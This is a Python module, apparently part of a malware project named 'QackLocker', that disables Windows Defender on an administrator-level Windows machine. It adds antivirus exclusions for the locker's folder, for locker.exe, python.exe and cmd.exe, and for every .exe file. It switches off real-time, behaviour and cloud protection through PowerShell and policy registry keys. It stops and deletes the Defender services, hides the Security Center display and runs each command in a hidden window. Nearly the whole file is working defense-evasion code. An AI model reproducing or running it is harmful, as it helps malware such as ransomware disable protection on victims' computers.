# language: Python, file: defender_bypass.py
# Отключение Defender из-под админа.
# На Win11 22H2+ с Tamper Protection: работает ТОЛЬКО add_exclusions.
# Остальное — после ручного выключения Tamper Protection в Windows Security.

import subprocess
import winreg

CREATE_NO_WINDOW = 0x08000000


def _run(cmd: list[str], timeout: int = 15) -> tuple[int, str]:
    """Возвращает (returncode, output). returncode == 0 — команда успешна."""
    try:
        r = subprocess.run(cmd, capture_output=True, text=True,
                           creationflags=CREATE_NO_WINDOW, timeout=timeout)
        return r.returncode, (r.stdout or "") + (r.stderr or "")
    except Exception as e:
        return -1, str(e)


def _ensure_key(hive, path: str) -> bool:
    """Рекурсивно создаёт все промежуточные ключи. CreateKeyEx создаёт только последний."""
    parts = path.split("\\")
    cur = ""
    for p in parts:
        cur = f"{cur}\\{p}" if cur else p
        try:
            winreg.CreateKeyEx(hive, cur, 0, winreg.KEY_CREATE_SUB_KEY)
        except Exception:
            return False
    return True


def _reg_set(hive, path: str, name: str, value, vtype=winreg.REG_DWORD) -> bool:
    """Создаёт ключ (со всеми родителями) и пишет значение. True — записано."""
    if not _ensure_key(hive, path):
        return False
    try:
        with winreg.OpenKey(hive, path, 0, winreg.KEY_SET_VALUE) as k:
            winreg.SetValueEx(k, name, 0, vtype, value)
        return True
    except Exception:
        return False


# ================= 1. Исключения (работает даже с Tamper Protection) =================
def add_exclusions() -> dict:
    """
    Единственный блок, который реально работает на Win11 22H2+ с Tamper Protection.
    Исключения не защищены Tamper Protection.
    """
    ps_script = (
        "Add-MpPreference -ExclusionPath \"$env:APPDATA\\QackLocker\" -ErrorAction SilentlyContinue; "
        "Add-MpPreference -ExclusionPath \"$env:TEMP\" -ErrorAction SilentlyContinue; "
        "Add-MpPreference -ExclusionPath \"$env:ProgramData\" -ErrorAction SilentlyContinue; "
        "Add-MpPreference -ExclusionProcess 'locker.exe' -ErrorAction SilentlyContinue; "
        "Add-MpPreference -ExclusionProcess 'python.exe' -ErrorAction SilentlyContinue; "
        "Add-MpPreference -ExclusionProcess 'cmd.exe' -ErrorAction SilentlyContinue; "
        "Add-MpPreference -ExclusionExtension '.exe' -ErrorAction SilentlyContinue"
    )
    rc, out = _run(["powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command", ps_script], timeout=20)
    # Проверяем, что исключения реально применились
    rc2, out2 = _run(["powershell", "-NoProfile", "-Command",
                      "(Get-MpPreference).ExclusionPath -join ';'"], timeout=10)
    applied = "QackLocker" in out2 or "locker.exe" in out2
    return {
        "set_rc": rc,
        "verify_rc": rc2,
        "applied": applied,
        "raw": out2.strip()[:500],
    }


# ================= 2. PowerShell Set-MpPreference =================
def disable_via_powershell() -> dict:
    """
    На Win11 22H2+ с Tamper Protection команды вернут rc=0, но настройки не изменятся.
    Проверяем реальное состояние через Get-MpPreference после.
    """
    ps_set = (
        "Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue; "
        "Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue; "
        "Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue; "
        "Set-MpPreference -DisableScriptScanning $true -ErrorAction SilentlyContinue; "
        "Set-MpPreference -DisableArchiveScanning $true -ErrorAction SilentlyContinue; "
        "Set-MpPreference -DisableIntrusionPreventionSystem $true -ErrorAction SilentlyContinue; "
        "Set-MpPreference -MAPSReporting 0 -ErrorAction SilentlyContinue; "
        "Set-MpPreference -SubmitSamplesConsent 2 -ErrorAction SilentlyContinue; "
        "Set-MpPreference -PUAProtection 0 -ErrorAction SilentlyContinue; "
        "Set-MpPreference -EnableControlledFolderAccess Disabled -ErrorAction SilentlyContinue; "
        "Set-MpPreference -EnableNetworkProtection Disabled -ErrorAction SilentlyContinue; "
        "Set-MpPreference -CloudBlockLevel 0 -ErrorAction SilentlyContinue"
    )
    rc, out = _run(["powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command", ps_set], timeout=20)

    # Проверяем, что realtime реально выключился
    rc2, out2 = _run(["powershell", "-NoProfile", "-Command",
                      "(Get-MpPreference).DisableRealtimeMonitoring"], timeout=10)
    realtime_off = "True" in out2
    return {
        "set_rc": rc,
        "verify_rc": rc2,
        "realtime_off": realtime_off,
        "raw": out2.strip()[:200],
    }


# ================= 3. Реестр — DisableAntiSpyware =================
def disable_via_registry() -> dict:
    """
    DisableAntiSpyware игнорируется с Win10 1903+. Ключ запишется, но Defender не отключится.
    Проверяем, что запись реально легла (не что Defender отключился).
    """
    policy = r"SOFTWARE\Policies\Microsoft\Windows Defender"
    rtp = policy + r"\Real-Time Protection"
    spynet = policy + r"\Spynet"

    written = {
        "DisableAntiSpyware": _reg_set(winreg.HKEY_LOCAL_MACHINE, policy, "DisableAntiSpyware", 1),
        "DisableAntiVirus": _reg_set(winreg.HKEY_LOCAL_MACHINE, policy, "DisableAntiVirus", 1),
        "ServiceStartup": _reg_set(winreg.HKEY_LOCAL_MACHINE, policy, "ServiceStartup", 4),
        "DisableRealtimeMonitoring": _reg_set(winreg.HKEY_LOCAL_MACHINE, rtp, "DisableRealtimeMonitoring", 1),
        "DisableBehaviorMonitoring": _reg_set(winreg.HKEY_LOCAL_MACHINE, rtp, "DisableBehaviorMonitoring", 1),
        "DisableIOAVProtection": _reg_set(winreg.HKEY_LOCAL_MACHINE, rtp, "DisableIOAVProtection", 1),
        "DisableScriptScanning": _reg_set(winreg.HKEY_LOCAL_MACHINE, rtp, "DisableScriptScanning", 1),
        "SpynetReporting": _reg_set(winreg.HKEY_LOCAL_MACHINE, spynet, "SpynetReporting", 0),
        "SubmitSamplesConsent": _reg_set(winreg.HKEY_LOCAL_MACHINE, spynet, "SubmitSamplesConsent", 2),
    }
    return {
        "written": written,
        "all_written": all(written.values()),
        # важно: запись значения != отключение Defender
        "effect": "unknown — DisableAntiSpyware игнорируется с Win10 1903+",
    }


# ================= 4. Остановка служб =================
def stop_services() -> dict:
    """
    WinDefend, WdNisSvc, Sense — protected processes. sc stop вернёт 5 (Access denied)
    при Tamper Protection. Проверяем реальный статус после.
    """
    services = ["WinDefend", "WdNisSvc", "Sense", "SecurityHealthService", "wscsvc", "MsMpSvc"]
    results = {}
    for svc in services:
        rc_stop, _ = _run(["sc", "stop", svc], timeout=10)
        rc_cfg, _ = _run(["sc", "config", svc, "start=", "disabled"], timeout=10)
        rc_query, out_query = _run(["sc", "query", svc], timeout=10)
        stopped = "STOPPED" in out_query.upper()
        results[svc] = {
            "stop_rc": rc_stop,
            "config_rc": rc_cfg,
            "stopped": stopped,
        }
    return results


# ================= 5. Удаление службы =================
def delete_defender_service() -> dict:
    """sc delete WinDefend — Access denied при Tamper Protection."""
    results = {}
    for svc in ("WinDefend", "WdNisSvc"):
        rc, out = _run(["sc", "delete", svc], timeout=10)
        results[svc] = {"rc": rc, "deleted": rc == 0, "raw": out.strip()[:200]}
    return results


# ================= 6. Политика =================
def disable_via_policy() -> dict:
    path = r"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection"
    written = {
        "DisableRealtimeMonitoring": _reg_set(winreg.HKEY_LOCAL_MACHINE, path, "DisableRealtimeMonitoring", 1),
        "DisableBehaviorMonitoring": _reg_set(winreg.HKEY_LOCAL_MACHINE, path, "DisableBehaviorMonitoring", 1),
        "DisableOnAccessProtection": _reg_set(winreg.HKEY_LOCAL_MACHINE, path, "DisableOnAccessProtection", 1),
        "HideSCAHealth": _reg_set(
            winreg.HKEY_LOCAL_MACHINE,
            r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer",
            "HideSCAHealth", 1,
        ),
    }
    return {"written": written, "all_written": all(written.values())}


# ================= 7. Проверка состояния Tamper Protection =================
def check_tamper_protection() -> dict:
    rc, out = _run(["powershell", "-NoProfile", "-Command",
                    "(Get-MpComputerStatus).IsTamperProtected"], timeout=10)
    return {
        "rc": rc,
        "raw": out.strip()[:100],
        "enabled": "True" in out,
    }


# ================= ГЛАВНАЯ =================
def bypass_defender() -> dict:
    """
    Запускает все шаги. Каждый шаг возвращает dict с честным статусом:
    сработало / не сработало / записано но без эффекта.
    """
    tp = check_tamper_protection()

    report = {
        "tamper_protection": tp,
        "exclusions": add_exclusions(),
        "powershell": disable_via_powershell(),
        "registry": disable_via_registry(),
        "services": stop_services(),
        "service_delete": delete_defender_service(),
        "policy": disable_via_policy(),
    }

    # Итоговая оценка
    report["summary"] = {
        "tamper_protection_on": tp["enabled"],
        "exclusions_applied": report["exclusions"]["applied"],
        "realtime_off": report["powershell"]["realtime_off"],
        "any_service_stopped": any(
            s["stopped"] for s in report["services"].values()
            if isinstance(s, dict)
        ),
        "note": (
            "Tamper Protection включён: работает только exclusions. "
            "Остальное — после ручного выключения TP в Windows Security."
            if tp["enabled"] else
            "Tamper Protection выключен: powershell/registry/services должны сработать."
        ),
    }
    return report


if __name__ == "__main__":
    import json
    print(json.dumps(bypass_defender(), indent=2, ensure_ascii=False))
